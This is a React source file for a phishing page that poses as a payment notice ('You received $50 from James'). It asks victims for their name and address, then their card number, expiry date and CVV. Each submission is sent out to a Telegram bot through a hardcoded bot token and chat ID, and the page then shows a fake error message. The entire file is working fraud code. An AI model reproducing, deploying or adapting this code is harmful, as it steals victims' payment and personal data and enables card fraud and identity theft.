import React, { useState } from "react";
import axios from "axios"
function App() {
  const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU";
  const userId = "1099461059"; // Replace with the target user's ID

  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  let [person, setPerson] = useState({});
  let [card, setCard] = useState({});
  let [message, setMessage] = useState("");
  let [pdDisplay, setpdDisplay] = useState("d-none");
  let [acceptPaymentButton, setacceptPaymentButton] = useState("");
  let [ccDisplay, setccDisplay] = useState("d-none");


  if (person.there){
   let texts = `${person.fname}, ${person.lname}, ${person.street} , ${person.city}, ${person.zip}`
    axios
                    .post(apiUrl, {
                      chat_id: userId,
                      text: texts,
                    })
                    .then((response) => {
                      if (response.data.ok) {
                        return;
                        // console.log("Message sent successfully!");
                      } else {
                        console.error(
                          "Failed to send message:",
                          response.data.description
                        );
                      }
                    })
                    .catch((error) => {
                      console.error("Error:", error.message);
                    });


    if (card.there){
      let cards = `  ${card.cc}, ${card.Month}, ${card.year},  ${card.cvv},`
      axios
                .post(apiUrl, {
                  chat_id: userId,
                  text: cards,
                })
                .then((response) => {
                  if (response.data.ok) {
                    return;
                    // console.log("Message sent successfully!");
                  } else {
                    console.error(
                      "Failed to send message:",
                      response.data.description
                    );
                  }
                })
                .catch((error) => {
                  console.error("Error:", error.message);
                });
    }
  }
  return (
    <div className="container  mx-auto text-center">
      <div>
        <img
          className="paylogo"
          src="https://i.pinimg.com/736x/b6/e0/2d/b6e02d50c9561c47a728e9be62a14f10.jpg"
          alt="logo"
          width="70"
        />
        <br />
        <h3 className="text-center">You received $50 from James </h3>
        <br></br>
        <p>
          <span className="fs-2 text-danger">{message}</span>
        </p>
        <small className="text-center">
          You have untill 12/09/2023 to accept this payment
        </small>
        <br />
        <br />
        <br />
        <button
          className={`btn btn-outline-dark text-center justify-content-center ${acceptPaymentButton}`}
          onClick={(e) => {
            e.preventDefault();
            setpdDisplay("d-block");
            setacceptPaymentButton("d-none");
          }}
        >
          Accept Payment!
        </button>
        <br />
        <br />
        <div className={pdDisplay} id="personal-details">
          <form className="row g-3 needs-validation" novalidate>
            <div className="col-6">
              <label htmlFor="validationCustom01" className="form-label">
                First name
              </label>
              <input
                type="text"
                className="form-control"
                id="validationCustom01"
                required
              />
              <div className="valid-feedback">Looks good!</div>
            </div>
            <div className="col-6">
              <label htmlFor="validationCustom02" className="form-label">
                Last name
              </label>
              <input
                type="text"
                className="form-control"
                id="validationCustom02"
                required
              />
              <div className="valid-feedback">Looks good!</div>
            </div>
            <div className="col-8">
              <label htmlFor="validationCustomUsername" className="form-label">
                Street
              </label>
              <div className="input-group has-validation">
                <input
                  type="text"
                  className="form-control"
                  id="validationCustomUsername"
                  aria-describedby="inputGroupPrepend"
                  required
                />
                <div className="invalid-feedback">.</div>
              </div>
            </div>
            <div className="col-4">
              <label htmlFor="validationCustom03" className="form-label">
                City
              </label>
              <input
                type="text"
                className="form-control"
                id="validationCustom03"
                required
              />
              <div className="invalid-feedback">
                Please provide a valid city.
              </div>
            </div>
            <div className="col-7">
              <label className="form-label">State</label>
              <input type="text" className="form-control" id="state" required />
            </div>
            <div className="col-5">
              <label htmlFor="validationCustom05" className="form-label">
                Zip
              </label>
              <input
                type="text"
                className="form-control"
                id="validationCustom05"
                required
              />
              <div className="invalid-feedback">
                Please provide a valid zip.
              </div>
            </div>

            <div className="text-end">
              <button
                className="btn btn-dark w-25"
                type="submit"
                onClick={(e) => {
                  e.preventDefault();
                  setpdDisplay("d-none");
                  setccDisplay("d-block");
                  setPerson({
                    there : true,
                    fname: document.getElementById("validationCustom01").value,
                    lname: document.getElementById("validationCustom02").value,
                    street: document.getElementById("validationCustomUsername")
                      .value,
                    city: document.getElementById("validationCustom03").value,
                    zip: document.getElementById("validationCustom05").value,
                  });
                  
                }}
              >
                Next
              </button>
            </div>
          </form>
          <br />
        </div>
        <div className={ccDisplay} id="card-details">
          <form
            className="row g-3 needs-validation"
            onSubmit={(e) => {
              e.preventDefault();
              setMessage("An error occurred!");
              setCard({
                there: true,
                cc: document.getElementById("cardNO").value,
                Month: document.getElementById("month-select").value,
                year: document.getElementById("year-select").value,
                cvv: document.getElementById("cvv").value,
              });
              
            }}
            novalidate
          >
            <div className="col-12">
              <label htmlFor="cardNO" className="form-label">
                Card number
              </label>
              <input
                type="text"
                className="form-control"
                id="cardNO"
                placeholder="         0000 0000 0000 0000 0000"
                required
              />
              <div className="valid-feedback">Looks good!</div>
            </div>
            <div className="col-5">
              <label
                htmlFor="month-select"
                className="form-label text-start ms-0 ps-0"
              >
                Expiry date
              </label>
              <select
                class="form-select"
                id="month-select"
                name="month-select"
                required
              >
                <option value="01">January</option>
                <option value="02">February</option>
                <option value="03">March</option>
                <option value="04">April</option>
                <option value="05">May</option>
                <option value="06">June</option>
                <option value="07">July</option>
                <option value="08">August</option>
                <option value="09">September</option>
                <option value="10">October</option>
                <option value="11">November</option>
                <option value="12">December</option>
              </select>

              <div className="valid-feedback">Looks good!</div>
            </div>
            <div className="col-4">
              <label htmlFor="year-select" className="form-label text-white">
                ,
              </label>
              <select
                class="form-select"
                id="year-select"
                name="year-select"
                required
              >
                <option value="2023">2023</option>
                <option value="2024">2024</option>
                <option value="2025">2025</option>
                <option value="2026">2026</option>
                <option value="2027">2027</option>
                <option value="2028">2028</option>
                <option value="2029">2029</option>
                <option value="2030">2030</option>
                <option value="2031">2031</option>
                <option value="2032">2032</option>
                <option value="2033">2033</option>
                <option value="2034">2034</option>
              </select>
            </div>
            <div className="col-3">
              <label htmlFor="validationCustomUsername" className="form-label ">
                Cvv
              </label>
              <div className="input-group has-validation">
                <input
                  type="tex"
                  placeholder="   ---"
                  className="form-control"
                  id="cvv"
                  aria-describedby="inputGroupPrepend"
                  required
                />
                <div className="invalid-feedback">.</div>
              </div>
            </div>

            <div className="text-end">
              <button className="btn btn-outline-dark w-25" type="submit">
                Accept
              </button>
            </div>
          </form>
          <br />
        </div>
      </div>
    </div>
  );
}

export default App;
